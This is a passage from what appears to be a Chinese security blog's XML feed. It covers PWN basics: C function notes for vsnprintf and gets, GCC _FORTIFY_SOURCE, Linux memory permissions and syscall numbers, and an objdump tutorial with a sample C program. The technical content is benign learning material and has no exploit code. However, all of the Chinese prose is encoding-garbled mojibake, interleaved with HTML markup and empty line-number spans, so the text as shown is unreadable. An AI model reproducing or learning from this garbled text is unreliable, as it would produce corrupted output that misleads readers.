æ­¤argçš„çŠ¶æ€å¾ˆå¯èƒ½è¢«è°ƒç”¨æ‰€æ”¹å˜ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œargéƒ½åº”è¯¥åœ¨è°ƒç”¨ä¹‹å‰çš„æŸä¸ªæ—¶åˆ»ç”±va_startåˆå§‹åŒ–ï¼Œå¹¶ä¸”åœ¨è°ƒç”¨ä¹‹åçš„æŸä¸ªæ—¶åˆ»ï¼Œé¢„è®¡ä¼šç”±va_endé‡Šæ”¾  å‚æ•°ï¼šs -- æŒ‡å‘å­˜å‚¨ç»“æœCå­—ç¬¦ä¸²çš„ç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œç¼“å†²åŒºåº”è‡³å°‘æœ‰nä¸ªå­—ç¬¦çš„å¤§å°     n -- åœ¨ç¼“å†²åŒºä¸­ä½¿ç”¨çš„æœ€å¤§å­—èŠ‚æ•°ï¼Œç”Ÿæˆçš„å­—ç¬¦ä¸²çš„é•¿åº¦è‡³å¤šä¸ºn-1ï¼Œä¸ºé¢å¤–çš„ç»ˆæ­¢ç©ºå­—ç¬¦ç•™ä¸‹ç©ºï¼Œsize_tæ˜¯ä¸€ä¸ªæ— ç¬¦å·æ•´æ•°ç±»å‹     format -- åŒ…å«æ ¼å¼å­—ç¬¦ä¸²çš„Cå­—ç¬¦ä¸²ï¼Œå…¶æ ¼å¼å­—ç¬¦ä¸²ä¸printfä¸­çš„æ ¼å¼ç›¸åŒ      arg -- æ ‡è¯†ä½¿ç”¨va_startåˆå§‹åŒ–çš„å˜é‡å‚æ•°åˆ—è¡¨çš„å€¼  è¿”å›å€¼ï¼šå¦‚æœnè¶³å¤Ÿå¤§ï¼Œåˆ™ä¼šå†™å…¥çš„å­—ç¬¦æ•°ï¼Œä¸åŒ…æ‹¬ç»ˆæ­¢ç©ºå­—ç¬¦ã€‚å¦‚æœå‘ç”Ÿç¼–ç é”™è¯¯ï¼Œåˆ™è¿”å›è´Ÿæ•°ã€‚æ³¨æ„ï¼Œåªæœ‰å½“è¿™ä¸ªè¿”å›å€¼æ˜¯éè´Ÿå€¼ä¸”å°äºnæ—¶ï¼Œå­—ç¬¦ä¸²æ‰è¢«å®Œå…¨å†™å…¥---------------------------------------------------------------------------------------&gt;&gt;&gt; gets():  æè¿°ï¼šchar *gets(char *str)     ä»æ ‡å‡†è¾“å…¥ stdin è¯»å–ä¸€è¡Œï¼Œå¹¶æŠŠå®ƒå­˜å‚¨åœ¨ str æ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ä¸­ã€‚å½“è¯»å–åˆ°æ¢è¡Œç¬¦æ—¶ï¼Œæˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶ï¼Œå®ƒä¼šåœæ­¢ï¼Œå…·ä½“è§†æƒ…å†µè€Œå®š  å‚æ•°ï¼šstr -- è¿™æ˜¯æŒ‡å‘ä¸€ä¸ªå­—ç¬¦æ•°ç»„çš„æŒ‡é’ˆï¼Œè¯¥æ•°ç»„å­˜å‚¨äº† C å­—ç¬¦ä¸²  è¿”å›å€¼ï¼šå¦‚æœæˆåŠŸï¼Œè¯¥å‡½æ•°è¿”å› strã€‚å¦‚æœå‘ç”Ÿé”™è¯¯æˆ–è€…åˆ°è¾¾æ–‡ä»¶æœ«å°¾æ—¶è¿˜æœªè¯»å–ä»»ä½•å­—ç¬¦ï¼Œåˆ™è¿”å› NULL <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">&#x2F;&#x2F;GCCç”¨æ³•gcc -D_FORTIFY_SOURCE&#x3D;1  ä»…ä»…åªåœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ£€æŸ¥ï¼ˆå°¤å…¶æ˜¯#include &lt;string.h&gt;è¿™ç§æ–‡ä»¶å¤´ï¼‰gcc -D_FORTIFY_SOURCE&#x3D;2  ç¨‹åºæ‰§è¡Œæ—¶ä¹Ÿä¼šè¿›è¡Œæ£€æŸ¥ï¼ˆå¦‚æœæ£€æŸ¥åˆ°ç¼“å†²åŒºæº¢å‡ºï¼Œå°±ä¼šç»ˆæ­¢ç¨‹åºï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åœ¨-D_FORTIFY_SOURCE=2æ—¶ï¼Œé€šè¿‡å¯¹æ•°ç»„å¤§å°æ¥åˆ¤æ–­æ›¿æ¢strcpyã€memcpyã€memsetç­‰å‡½æ•°åï¼Œä»è€Œè¾¾åˆ°é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„ä½œç”¨</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNåŸºç¡€-something_about_linux</title>
      <link href="/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/"/>
      <url>/2025/02/06/PWN%E5%9F%BA%E7%A1%80-something-about-linux/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h2><p>â€Œ<strong>rwxpåˆ†åˆ«æŒ‡Linuxè™šæ‹Ÿå†…å­˜æƒé™çš„ä¸åŒéƒ¨åˆ†ï¼Œå…·ä½“å«ä¹‰å¦‚ä¸‹</strong>â€Œ</p><ul><li>â€Œ<strong>r</strong>â€Œï¼šè¯»æƒé™ï¼ˆReadï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥è¯»å–å†…å­˜åŒºåŸŸçš„å†…å®¹ã€‚</li><li>â€Œ<strong>w</strong>â€Œï¼šå†™æƒé™ï¼ˆWriteï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥ä¿®æ”¹å†…å­˜åŒºåŸŸçš„å†…å®¹ã€‚</li><li>â€Œ<strong>x</strong>â€Œï¼šæ‰§è¡Œæƒé™ï¼ˆExecuteï¼‰ï¼Œè¡¨ç¤ºå¯ä»¥æ‰§è¡Œå†…å­˜åŒºåŸŸä¸­çš„ä»£ç ã€‚</li><li>â€Œ<strong>p</strong>â€Œï¼šç§æœ‰æƒé™ï¼ˆPrivateï¼‰ï¼Œè¡¨ç¤ºè¯¥å†…å­˜åŒºåŸŸçš„å†…å®¹åœ¨è¿›ç¨‹é—´æ˜¯ç§æœ‰çš„ï¼Œå…¶ä»–è¿›ç¨‹æ— æ³•è®¿é—®ã€‚<h2 id="ç³»ç»Ÿè°ƒç”¨å·"><a href="#ç³»ç»Ÿè°ƒç”¨å·" class="headerlink" title="ç³»ç»Ÿè°ƒç”¨å·"></a>ç³»ç»Ÿè°ƒç”¨å·</h2>åœ¨Linuxä¸­ï¼Œæ¯ä¸ªç³»ç»Ÿè°ƒç”¨è¢«èµ‹äºˆä¸€ä¸ªç³»ç»Ÿè°ƒç”¨å·ã€‚è¿™æ ·ï¼Œé€šè¿‡ç‹¬ä¸€æ— äºŒçš„å·å°±å¯ä»¥å…³è”ç³»ç»Ÿè°ƒç”¨ã€‚å½“ç”¨æˆ·ç©ºé—´çš„è¿›ç¨‹æ‰§è¡Œä¸€ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶å€™ï¼Œè¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·å°±ç”¨æ¥æŒ‡æ˜åˆ°åº•æ˜¯è¦æ‰§è¡Œå“ªä¸ªç³»ç»Ÿè°ƒç”¨ï¼›è¿›ç¨‹ä¸ä¼šæåŠç³»ç»Ÿè°ƒç”¨çš„åç§°ã€‚</li></ul><p>ç³»ç»Ÿè°ƒç”¨å·ç›¸å½“é‡è¦ï¼Œä¸€æ—¦åˆ†é…å°±ä¸èƒ½å†åˆä»»ä½•å˜æ›´ï¼Œå¦åˆ™ç¼–è¯‘å¥½çš„åº”ç”¨ç¨‹åºå°±ä¼šå´©æºƒã€‚æ­¤å¤–ï¼Œå¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œå®ƒæ‰€å ç”¨çš„ç³»ç»Ÿè°ƒç”¨å·ä¹Ÿä¸å…è®¸è¢«å›æ”¶åˆ©ç”¨ï¼Œå¦åˆ™ï¼Œä»¥å‰ç¼–è¯‘è¿‡çš„ä»£ç ä¼šè°ƒç”¨è¿™ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œä½†äº‹å®ä¸Šå´è°ƒç”¨çš„æ˜¯å¦å¤–ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ã€‚</p><blockquote><p>Linuxæœ‰ä¸€ä¸ªâ€œæœªå®ç°â€ç³»ç»Ÿè°ƒç”¨sys_ni_syscall(),å®ƒé™¤äº†è¿”å›-ENOSYSå¤–ä¸åšä»»ä½•å…¶ä»–å·¥ä½œï¼Œè¿™ä¸ªé”™è¯¯å·å°±æ˜¯ä¸“é—¨é’ˆå¯¹æ— æ•ˆçš„ç³»ç»Ÿè°ƒç”¨è€Œè®¾çš„ã€‚è™½ç„¶å¾ˆç½•è§ï¼Œä½†å¦‚æœä¸€ä¸ªç³»ç»Ÿè°ƒç”¨è¢«åˆ é™¤ï¼Œæˆ–è€…å˜å¾—ä¸å¯ç”¨ï¼Œè¿™ä¸ªå‡½æ•°å°±è¦è´Ÿè´£â€œå¡«è¡¥ç©ºç¼ºâ€</p></blockquote><p>å†…æ ¸è®°å½•äº†ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­çš„æ‰€æœ‰å·²æ³¨å†Œè¿‡çš„ç³»ç»Ÿè°ƒç”¨çš„åˆ—è¡¨ï¼Œå­˜å‚¨åœ¨sys_call_tableä¸­ã€‚æ¯ä¸€ç§ä½“ç³»ç»“æ„ä¸­ï¼Œéƒ½æ˜ç¡®å®šä¹‰äº†è¿™ä¸ªè¡¨ã€‚è¿™ä¸ªè¡¨ä¸ºæ¯ä¸€ä¸ªæœ‰æ•ˆçš„ç³»ç»Ÿè°ƒç”¨æŒ‡å®šäº†å”¯ä¸€çš„ç³»ç»Ÿè°ƒç”¨å·<br><a href="https://blog.csdn.net/qq_41202237/article/details/107249667">Linux32ä½ç³»ç»Ÿè°ƒç”¨å·</a><br><a href="https://hollk.blog.csdn.net/article/details/107250349">Linux64ä½ç³»ç»Ÿè°ƒç”¨å·</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·objdump</title>
      <link href="/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/"/>
      <url>/2025/02/04/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7objdump/</url>
      
        <content type="html"><![CDATA[<p>objdump å‘½ä»¤æ˜¯ <a href="https://www.gnu.org/software/binutils/">GNU Binutils</a> äºŒè¿›åˆ¶å·¥å…·é›†çš„ä¸€å‘˜ï¼Œç”¨äºæŸ¥çœ‹ç›®æ ‡æ–‡ä»¶æˆ–å¯æ‰§è¡Œæ–‡ä»¶çš„ç»„æˆä¿¡æ¯ï¼Œä»¥å¯è¯»çš„å½¢å¼æ‰“å°äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump [options] obj_file #[]è¡¨ç¤ºå¯é€‰ï¼Œobj_fileè¡¨ç¤ºç›®æ ‡æ–‡ä»¶<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h4 id="å¸¸ç”¨"><a href="#å¸¸ç”¨" class="headerlink" title="å¸¸ç”¨"></a>å¸¸ç”¨</h4><p><code>objdump -T libc.so.6 |grep system</code></p><h2 id="objdumpå‚æ•°"><a href="#objdumpå‚æ•°" class="headerlink" title="objdumpå‚æ•°"></a>objdumpå‚æ•°</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-a, --archive-headersæ˜¾ç¤ºæ¡£æ¡ˆå¤´ä¿¡æ¯ï¼Œå±•ç¤ºæ¡£æ¡ˆæ¯ä¸€ä¸ªæˆå‘˜çš„æ–‡ä»¶æ ¼å¼ã€‚æ•ˆæœç­‰åŒäºå‘½ä»¤ ar -tv-b, --target&#x3D;BFDNAMEæŒ‡å®šç›®æ ‡ç æ ¼å¼ã€‚è¿™ä¸æ˜¯å¿…é¡»çš„ï¼Œobjdump èƒ½è‡ªåŠ¨è¯†åˆ«è®¸å¤šæ ¼å¼ï¼Œæ¯”å¦‚ objdump -b oasys -m vax -h fu.o æ˜¾ç¤º fu.o çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯ï¼Œæ˜ç¡®æŒ‡å‡ºè¯¥æ–‡ä»¶æ˜¯ Vax ç³»ç»Ÿä¸‹ç”¨ Oasys ç¼–è¯‘å™¨ç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶ã€‚objdump -i å°†ç»™å‡ºè¿™é‡Œå¯ä»¥æŒ‡å®šçš„ç›®æ ‡ç æ ¼å¼åˆ—è¡¨-C, --demangle[&#x3D;STYLE]ç›®æ ‡æ–‡ä»¶ä¸­çš„ç¬¦å·è§£ç æˆç”¨æˆ·çº§åç§°ã€‚æ¯”å¦‚ç§»é™¤ç¬¦å·ä¿®é¥°æ—¶åœ¨å˜é‡ä¸å‡½æ•°åå‰æ·»åŠ çš„ä¸‹åˆ’çº¿ç­‰ã€‚-d, --disassembleåæ±‡ç¼–ç›®æ ‡æ–‡ä»¶ï¼Œå°†æœºå™¨æŒ‡ä»¤åæ±‡ç¼–æˆæ±‡ç¼–ä»£ç -D, --disassemble-allä¸ -d ç±»ä¼¼ï¼Œä½†åæ±‡ç¼–æ‰€æœ‰æ®µï¼ˆsectionï¼‰-z, --disassemble-zeroesä¸€èˆ¬åæ±‡ç¼–è¾“å‡ºå°†çœç•¥é›¶å—ï¼Œè¯¥é€‰é¡¹ä½¿å¾—è¿™äº›é›¶å—ä¹Ÿè¢«åæ±‡ç¼– -EB, -EL,--endian&#x3D;&#123;big | little&#125;æŒ‡å®šç›®æ ‡æ–‡ä»¶çš„å­—èŠ‚åºï¼Œåœ¨ç›®æ ‡æ–‡ä»¶æ²¡æè¿°å­—èŠ‚åºæ—¶å¾ˆæœ‰ç”¨ï¼Œä¾‹å¦‚ S-recordsã€‚è¿™ä¸ªé€‰é¡¹åªå½±å“åæ±‡ç¼–-f, --file-headersæ˜¾ç¤ºæ¯ä¸€ä¸ªç›®æ ‡æ–‡ä»¶çš„å¤´ä¿¡æ¯-F, --file-offsetsåæ±‡ç¼–æ—¶ï¼Œæ‰“å°æ¯ä¸€ä¸ªç¬¦å·çš„åç§»åœ°å€--file-start-contextæ˜¾ç¤ºæºç &#x2F;æ±‡ç¼–ä»£ç ï¼ˆå‡è®¾ä¸º -Sï¼‰æ—¶ï¼Œå°†ä¸Šä¸‹æ–‡æ‰©å±•åˆ°æ–‡ä»¶çš„å¼€å¤´-g, --debuggingæ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ã€‚ä¼å›¾è§£æä¿å­˜åœ¨æ–‡ä»¶ä¸­çš„è°ƒè¯•ä¿¡æ¯å¹¶ä»¥ C è¯­è¨€çš„è¯­æ³•æ˜¾ç¤ºå‡ºæ¥ã€‚ä»…ä»…æ”¯æŒæŸäº›ç±»å‹çš„è°ƒè¯•ä¿¡æ¯ã€‚æœ‰äº›å…¶ä»–çš„æ ¼å¼è¢«readelf -wæ”¯æŒ-e, --debugging-tagsç±»ä¼¼ -g é€‰é¡¹ï¼Œä½†æ˜¯ç”Ÿæˆçš„ä¿¡æ¯æ˜¯å’Œctagså·¥å…·ç›¸å…¼å®¹çš„æ ¼å¼-h, --section-headers, --headersæ˜¾ç¤ºç›®æ ‡æ–‡ä»¶å„ä¸ª section çš„å¤´éƒ¨æ‘˜è¦ä¿¡æ¯-i, --infoæ˜¾ç¤ºå¯¹äº -b æˆ–è€… -m é€‰é¡¹å¯ç”¨çš„æ¶æ„å’Œç›®æ ‡æ ¼å¼åˆ—è¡¨-j, --section&#x3D;NAMEä»…æ˜¾ç¤ºæŒ‡å®šåç§°çš„ section çš„ä¿¡æ¯ -l, --line-numbersç”¨æ–‡ä»¶åå’Œè¡Œå·æ ‡æ³¨ç›¸åº”çš„ç›®æ ‡ä»£ç ï¼Œä»…ä»…å’Œ -dã€-D æˆ–è€… -r ä¸€èµ·ä½¿ç”¨-S,--sourceåæ±‡ç¼–æ—¶å°½å¯èƒ½ä½¿ç”¨æºä»£ç è¡¨ç¤ºã€‚éšå«äº†-då‚æ•°-m, --architecture&#x3D;MACHINEæŒ‡å®šåæ±‡ç¼–ç›®æ ‡æ–‡ä»¶æ—¶ä½¿ç”¨çš„æ¶æ„ï¼Œå½“å¾…åæ±‡ç¼–æ–‡ä»¶æœ¬èº«æ²¡æè¿°æ¶æ„ä¿¡æ¯çš„æ—¶å€™(æ¯”å¦‚S-records)ï¼Œè¿™ä¸ªé€‰é¡¹å¾ˆæœ‰ç”¨ã€‚å¯ä»¥ç”¨-ié€‰é¡¹åˆ—å‡ºè¿™é‡Œèƒ½å¤ŸæŒ‡å®šçš„æ¶æ„-M, --disassembler-options&#x3D;OPTIONSç»™åæ±‡ç¼–ç¨‹åºä¼ é€’å‚æ•°ï¼Œå¯ä»¥æŒ‡å®šå¤šä¸ªï¼Œä½¿ç”¨é€—å·åˆ†éš”-p, --private-headersæ‰“å°ç›®æ ‡æ–‡ä»¶æ ¼å¼çš„ç‰¹å®šä¿¡æ¯ã€‚æ‰“å°çš„ä¿¡æ¯å–å†³äºç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼Œå¯¹äºæŸäº›ç›®æ ‡æ–‡ä»¶æ ¼å¼ï¼Œä¸æ‰“å°ä»»ä½•é™„åŠ ä¿¡æ¯ã€‚-P, --private&#x3D;OPTIONSæ‰“å°ç›®æ ‡æ–‡ä»¶æ ¼å¼çš„ç‰¹å®šä¿¡æ¯ã€‚OPTIONS æ˜¯ä¸€ä¸ªé€—å·åˆ†éš”çš„åˆ—è¡¨ã€‚ä¾‹å¦‚å¯¹äºXCOFFï¼Œå¯ç”¨çš„é€‰é¡¹æœ‰ header, aout, sections, syms, relocs, lineno, loader, except, typchk, traceback and toc-r, --relocæ˜¾ç¤ºæ–‡ä»¶çš„é‡å®šä½å…¥å£ã€‚å¦‚æœå’Œ-dæˆ–è€…-Dä¸€èµ·ä½¿ç”¨ï¼Œé‡å®šä½éƒ¨åˆ†ä»¥åæ±‡ç¼–åçš„æ ¼å¼æ˜¾ç¤ºå‡ºæ¥-R, --dynamic-relocæ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€é‡å®šä½å…¥å£ï¼Œä»…ä»…å¯¹äºåŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“-s, --full-contentsæ˜¾ç¤ºsectionçš„å®Œæ•´å†…å®¹ã€‚é»˜è®¤æ‰€æœ‰çš„éç©ºsectionéƒ½ä¼šè¢«æ˜¾ç¤º-W[lLiaprmfFsoRt],--dwarf&#x3D;[rawline,&#x3D;decodedline,&#x3D;info,&#x3D;abbrev,&#x3D;pubnames,&#x3D;aranges,&#x3D;macro,&#x3D;frames,&#x3D;frames-interp,&#x3D;str,&#x3D;loc,&#x3D;Ranges,&#x3D;pubtypes,&#x3D;trace_info,&#x3D;trace_abbrev,&#x3D;trace_aranges,&#x3D;gdb_index]æ˜¾ç¤ºæ–‡ä»¶ä¸­è°ƒè¯•æ®µçš„å†…å®¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯-G, --stabsæ˜¾ç¤ºè¯·æ±‚çš„ä»»ä½• section çš„å…¨éƒ¨å†…å®¹ã€‚æ˜¾ç¤ºæ®µ .stabã€.stab.index å’Œ .stab.excl çš„å†…å®¹-t, --symsæ˜¾ç¤ºæ–‡ä»¶çš„ç¬¦å·è¡¨å…¥å£ã€‚ç±»ä¼¼äºnm -sæä¾›çš„ä¿¡æ¯-T, --dynamic-symsæ˜¾ç¤ºæ–‡ä»¶çš„åŠ¨æ€ç¬¦å·è¡¨å…¥å£ï¼Œä»…ä»…å¯¹åŠ¨æ€ç›®æ ‡æ–‡ä»¶æ„ä¹‰ï¼Œæ¯”å¦‚æŸäº›å…±äº«åº“ã€‚å®ƒæ˜¾ç¤ºçš„ä¿¡æ¯ç±»ä¼¼äº nm -D,--dynamic æ˜¾ç¤ºçš„ä¿¡æ¯-x, --all-headersæ˜¾ç¤ºæ‰€å¯ç”¨çš„å¤´ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç¬¦å·è¡¨ã€é‡å®šä½å…¥å£ã€‚-x ç­‰ä»·äº -a -f -h -p -r -t åŒæ—¶æŒ‡å®š-w, --wideä¸ºå…·æœ‰è¶…è¿‡80åˆ—çš„è¾“å‡ºè®¾å¤‡æ ¼å¼åŒ–æŸäº›è¡Œã€‚ä¹Ÿä¸è¦åœ¨æ˜¾ç¤ºç¬¦å·åç§°æ—¶æˆªæ–­ç¬¦å·åç§°--start-address&#x3D;ADDRESSä»æŒ‡å®šåœ°å€å¼€å§‹æ˜¾ç¤ºæ•°æ®ï¼Œè¯¥é€‰é¡¹å½±å“ -dã€-r å’Œ -s é€‰é¡¹çš„è¾“å‡º--stop-address&#x3D;ADDRESSæ˜¾ç¤ºæ•°æ®ç›´åˆ°æŒ‡å®šåœ°å€ä¸ºæ­¢ï¼Œè¯¥é¡¹å½±å“-dã€-rå’Œ-sé€‰é¡¹çš„è¾“å‡º--prefix-addressesåæ±‡ç¼–çš„æ—¶å€™ï¼Œæ˜¾ç¤ºæ¯ä¸€è¡Œçš„å®Œæ•´åœ°å€ã€‚è¿™æ˜¯ä¸€ç§æ¯”è¾ƒè€çš„åæ±‡ç¼–æ ¼å¼--no-show-raw-insnåæ±‡ç¼–æ—¶ï¼Œä¸æ˜¾ç¤ºæ±‡ç¼–æŒ‡ä»¤çš„æœºå™¨ç ã€‚å½“ä½¿ç”¨--prefix-addressesæ—¶ï¼Œè¿™æ˜¯ç¼ºçœé€‰é¡¹--adjust-vma&#x3D;OFFSETå½“è§£æä¿¡æ¯æ—¶ï¼Œé¦–å…ˆç»™æ‰€æœ‰çš„æ®µæ·»åŠ åç§»å€¼offsetã€‚å½“æ®µåœ°å€ä¸ç¬¦å·è¡¨ä¸ç¬¦æ—¶ï¼Œè¿™ä¸ªé€‰é¡¹å¾ˆæœ‰ç”¨ã€‚æ¯”å¦‚å°†æ®µæ”¾ç½®åˆ°ç‰¹æ®Šåœ°å€ï¼Œå› ä¸ºæŸä¸ªæ ¼å¼æ— æ³•è¡¨ç¤ºæ®µåœ°å€ï¼Œæ¯”å¦‚ a.out--special-symsæ˜¾ç¤ºç‰¹æ®Šç¬¦å·ä¸ç”¨æˆ·ä¸å…³å¿ƒçš„ç¬¦å·--prefix&#x3D;PREFIXå½“ä½¿ç”¨ -S æ—¶ï¼ŒæŒ‡å®šå‰ç¼€æ·»åŠ åˆ°ç»å¯¹è·¯å¾„ä¸­--prefix-strip&#x3D;LEVELæŒ‡å®šå‰¥ç¦»ç»å¯¹è·¯å¾„ä¸­å¤šå°‘ä¸ªå‰ç¼€ç›®å½•åã€‚æ­¤é€‰é¡¹åªæœ‰åœ¨ä½¿ç”¨äº†é€‰é¡¹ --prefix&#x3D;PREFIX æ‰æœ‰æ•ˆ--insn-width&#x3D;WIDTHæŒ‡å®šåæ±‡ç¼–åçš„æŒ‡ä»¤è¾“å‡ºçš„è¡Œå®½ï¼Œå•ä½å­—èŠ‚-V, --versionç‰ˆæœ¬ä¿¡æ¯-H, --helpå¸®åŠ©ä¿¡æ¯<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ“ä½œ"><a href="#æ“ä½œ" class="headerlink" title="æ“ä½œ"></a>æ“ä½œ</h2><h3 id="1-æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç "><a href="#1-æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç " class="headerlink" title="1.æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç "></a>1.æŸ¥çœ‹Cç¨‹åºçš„æ±‡ç¼–ä»£ç å’Œæºä»£ç </h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">gcc -g test.c -o test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt; int add(int a, int b)&#123;    return a+b;&#125;int sub(int a, int b)&#123;    return a-b;&#125; int main()&#123;    int a &#x3D; 88;    int b &#x3D; 66;     int sum &#x3D; add(a, b);    printf(&quot;a&#x3D;%d, b&#x3D;%d, a+b&#x3D;%d\n&quot;, a, b, sum);     int dif &#x3D; sub(a, b);    printf(&quot;a&#x3D;%d, b&#x3D;%d, a-b&#x3D;%d\n&quot;, a, b, dif);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump -D test | less #objdump -Då‘½ä»¤æ¥æŸ¥çœ‹testçš„æ±‡ç¼–ä»£ç ã€‚objdump -S test | less #objdump -Så‘½ä»¤æ¥ä»¥æ±‡ç¼–å’Œæºä»£ç çš„å½¢å¼æŸ¥çœ‹testçš„ä»£ç ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€"><a href="#2-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€" class="headerlink" title="2.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€"></a>2.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­å‡½æ•°è°ƒç”¨çš„åœ°å€</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‡½æ•°è°ƒç”¨åœ°å€ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump -d -j .plt test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="3-æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€"><a href="#3-æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€" class="headerlink" title="3.æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€"></a>3.æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€</h3><p>å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æŸ¥çœ‹å…±äº«åº“ä¸­å‡½æ•°çš„åœ°å€ï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump -T &#x2F;lib&#x2F;libc.so.6<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><h3 id="4-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨"><a href="#4-æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨" class="headerlink" title="4.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨"></a>4.æŸ¥çœ‹å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„ç¬¦å·è¡¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">objdump -t test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯ä»¥åœ¨ç¬¦å·è¡¨ä¸­æ‰¾åˆ°subï¼Œaddçš„åœ°å€<br><pre 